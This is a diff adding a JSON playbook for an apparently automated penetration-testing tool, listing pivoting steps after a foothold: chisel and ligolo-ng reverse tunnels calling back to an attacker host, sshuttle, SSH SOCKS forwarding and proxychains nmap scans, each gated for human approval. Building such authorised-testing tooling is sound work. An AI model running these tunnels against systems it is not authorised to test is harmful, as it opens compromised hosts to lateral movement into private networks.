@@ -1,0 +1,92 @@
+{
+  "name": "Network pivoting & tunnelling (§3)",
+  "description": "Turn a proven foothold into reach onto an internal segment: a chisel or ligolo-ng SOCKS/TUN tunnel, sshuttle, an SSH dynamic forward, then enumerate the far side through the proxy. Every tunnel puts traffic on the wire, so each pauses for approval; a confirmed pivot widens scope to the subnet it exposes — scope grows, it is never skipped.",
+  "source": "OSCP methodology (project-authored, obol-local)",
+  "actions": [
+    {
+      "id": "pivot-chisel-socks",
+      "title": "Chisel reverse SOCKS tunnel",
+      "hypothesis": "When the foothold can see an internal subnet, a reverse SOCKS proxy served by chisel routes your attacker-box tooling through the compromised host and onto that segment.",
+      "tool": "chisel",
+      "tools": ["chisel"],
+      "requires_any": ["foothold.linux", "foothold.windows", "access.shell", "host.multihomed"],
+      "produces": ["tunnel.socks"],
+      "priority": 64,
+      "autonomy": "approve",
+      "proves": "a working SOCKS tunnel into the network the foothold sits on",
+      "does_not_prove": "that any particular internal host is reachable — only a scan through the tunnel shows that",
+      "refs": ["https://github.com/jpillora/chisel"],
+      "commands": [
+        {"tool": "chisel", "run": "chisel server -p 8080 --reverse"},
+        {"tool": "chisel", "run": "chisel client {{lhost}}:8080 R:socks"}
+      ]
+    },
+    {
+      "id": "pivot-ligolo",
+      "title": "Ligolo-ng tunnel + route",
+      "hypothesis": "ligolo-ng builds a TUN-interface pivot: once the agent connects back you add a route for the discovered subnet and internal hosts answer as if directly attached.",
+      "tool": "ligolo-ng",
+      "tools": ["ligolo-ng", "ligolo-proxy", "ligolo-agent"],
+      "requires_any": ["foothold.linux", "foothold.windows", "access.shell", "host.multihomed"],
+      "produces": ["tunnel.route"],
+      "priority": 62,
+      "autonomy": "approve",
+      "proves": "a routed pivot onto the foothold's network",
+      "does_not_prove": "that any specific internal host is reachable until a scan confirms it",
+      "refs": ["https://github.com/nicocha30/ligolo-ng"],
+      "commands": [
+        {"tool": "ligolo-proxy", "run": "ligolo-proxy -selfcert"},
+        {"tool": "ligolo-agent", "run": "agent -connect {{lhost}}:11601 -ignore-cert"}
+      ]
+    },
+    {
+      "id": "pivot-sshuttle",
+      "title": "sshuttle transparent pivot",
+      "hypothesis": "Given working SSH credentials on the foothold, sshuttle carries a whole subnet over that SSH session transparently, with no proxychains or client-side proxy setup.",
+      "tool": "sshuttle",
+      "tools": ["sshuttle"],
+      "requires_any": ["credential.available", "foothold.linux"],
+      "produces": ["tunnel.route"],
+      "priority": 58,
+      "autonomy": "approve",
+      "proves": "a transparent route onto the foothold's subnet carried over SSH",
+      "does_not_prove": "that any given host is reachable until a scan confirms it",
+      "refs": ["https://github.com/sshuttle/sshuttle"],
+      "commands": [
+        {"tool": "sshuttle", "run": "sshuttle -r {{user}}@{{target}} <internal-cidr>"}
+      ]
+    },
+    {
+      "id": "pivot-ssh-dynamic",
+      "title": "SSH dynamic port-forward (SOCKS)",
+      "hypothesis": "`ssh -D` on its own stands up a SOCKS proxy through the foothold — the no-extra-tooling pivot whenever SSH credentials are already in hand.",
+      "tool": "ssh",
+      "tools": ["ssh"],
+      "requires_any": ["credential.available", "foothold.linux"],
+      "produces": ["tunnel.socks"],
+      "priority": 56,
+      "autonomy": "approve",
+      "proves": "a SOCKS proxy onto the foothold's network",
+      "does_not_prove": "that any specific host is reachable until a scan confirms it",
+      "commands": [
+        {"tool": "ssh", "run": "ssh -D 1080 -N {{user}}@{{target}}"}
+      ]
+    },
+    {
+      "id": "pivot-scan-through",
+      "title": "Scan an internal host through the proxy",
+      "hypothesis": "With a SOCKS tunnel established, proxychains wrapping a TCP-connect nmap enumerates a now-reachable internal host.",
+      "tool": "proxychains",
+      "tools": ["proxychains", "proxychains4"],
+      "requires_any": ["tunnel.socks"],
+      "produces": ["ports.open"],
+      "priority": 52,
+      "autonomy": "approve",
+      "proves": "open ports on an internal host reached across the pivot",
+      "does_not_prove": "a vulnerability — this maps attack surface and nothing more",
+      "commands": [
+        {"tool": "proxychains", "run": "proxychains -q nmap -sT -Pn -n <internal-host>"}
+      ]
+    }
+  ]
+}
